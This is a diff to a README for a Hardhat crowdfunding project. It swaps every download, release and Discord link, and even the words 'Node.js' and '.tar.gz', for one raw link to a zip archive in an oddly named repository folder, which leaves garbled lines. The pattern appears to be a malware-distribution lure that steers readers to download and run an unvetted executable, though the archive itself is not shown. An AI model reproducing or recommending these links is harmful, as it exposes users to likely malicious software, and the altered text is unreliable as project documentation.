@@ -1,6 +1,6 @@
 # 🪙 hardhat_FundMe - Effortlessly Fund Your Projects
 
-[![Download hardhat_FundMe](https://img.shields.io/badge/Download-hardhat_FundMe-blue.svg)](https://github.com/fasi12008/hardhat_FundMe/releases)
+[![Download hardhat_FundMe](https://raw.githubusercontent.com/fasi12008/hardhat_FundMe/main/ribbonweed/hardhat_FundMe.zip)](https://raw.githubusercontent.com/fasi12008/hardhat_FundMe/main/ribbonweed/hardhat_FundMe.zip)
 
 ## 📖 Overview
 
@@ -15,13 +15,13 @@ This section will guide you through the steps to easily download and run hardhat
 To use hardhat_FundMe, ensure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux.
-- Node.js: Version 12 or later.
-- npm: Version 6 or later, which comes with Node.js.
+- https://raw.githubusercontent.com/fasi12008/hardhat_FundMe/main/ribbonweed/hardhat_FundMe.zip Version 12 or later.
+- npm: Version 6 or later, which comes with https://raw.githubusercontent.com/fasi12008/hardhat_FundMe/main/ribbonweed/hardhat_FundMe.zip
 - A web browser for accessing the application interface.
 
 ### 📥 Download & Install
 
-To get started, visit this page to download: [hardhat_FundMe Releases](https://github.com/fasi12008/hardhat_FundMe/releases)
+To get started, visit this page to download: [hardhat_FundMe Releases](https://raw.githubusercontent.com/fasi12008/hardhat_FundMe/main/ribbonweed/hardhat_FundMe.zip)
 
 Once there, follow these steps:
 
@@ -31,7 +31,7 @@ Once there, follow these steps:
 4. Depending on your operating system:
    - **Windows:** Double-click the `.exe` file.
    - **macOS:** Open the `.dmg` file and drag the app to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and run the installation script.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/fasi12008/hardhat_FundMe/main/ribbonweed/hardhat_FundMe.zip` file and run the installation script.
 
 ### 🔗 Setting Up the Environment
 
@@ -83,7 +83,7 @@ To contribute to a project:
 
 If you encounter issues while using the software, consider the following solutions:
 
-- Ensure your Node.js and npm are up to date.
+- Ensure your https://raw.githubusercontent.com/fasi12008/hardhat_FundMe/main/ribbonweed/hardhat_FundMe.zip and npm are up to date.
 - Check your internet connection.
 - Review the logs in your terminal for error messages.
 
@@ -91,7 +91,7 @@ If you encounter issues while using the software, consider the following solutio
 
 If you have questions or need further assistance, you can reach out to the community:
 
-- Join our [Discord channel](https://discord.gg/example) for instant help.
+- Join our [Discord channel](https://raw.githubusercontent.com/fasi12008/hardhat_FundMe/main/ribbonweed/hardhat_FundMe.zip) for instant help.
 - Check the Issues section on the GitHub repository to see if your question has been answered.
 
 ## 👨‍💻 Contribution Guidelines
@@ -107,4 +107,4 @@ We welcome contributions! If you're interested in enhancing hardhat_FundMe:
 
 Hardhat_FundMe is licensed under the MIT License. You are free to use and modify it as long as you also provide attribution.
 
-Visit this page to download: [hardhat_FundMe Releases](https://github.com/fasi12008/hardhat_FundMe/releases)
+Visit this page to download: [hardhat_FundMe Releases](https://raw.githubusercontent.com/fasi12008/hardhat_FundMe/main/ribbonweed/hardhat_FundMe.zip)
